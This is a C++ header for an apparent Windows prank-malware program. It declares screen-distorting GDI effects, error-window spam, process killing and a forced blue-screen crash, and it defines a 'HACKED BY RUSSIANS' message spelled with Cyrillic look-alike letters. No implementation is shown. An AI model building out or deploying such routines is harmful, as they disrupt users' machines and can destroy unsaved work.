#pragma once

#include <iostream>
#include <windows.h>
#include <gdiplus.h>
#include <mutex>
#include <thread>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")

#include "..\Resource\resource.h"

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

HWND CreateMainWindow(HINSTANCE hInstance);

WNDCLASSEX InitWndClass(HINSTANCE hInstance);

namespace GDI {
	void InvertColor();
	void PointEffect();
}

void ERRORSpam(HWND hWnd);
void CloseProcesses();

void BlueScreen(); //BSOD

const char CLASS_NAME[] =	"MainWindowClass";
const char RULE_CLASS_NAME[] =	"MainWindowClass";

#define ERRORMESSAGE		"HAСKЕD ВY RUSSIАNS :D"

#define WindowName			"! ERROR !"
#define WindowSize			512

#define ScreenWidth			GetSystemMetrics(SM_CXSCREEN)
#define ScreenHeight		GetSystemMetrics(SM_CYSCREEN)
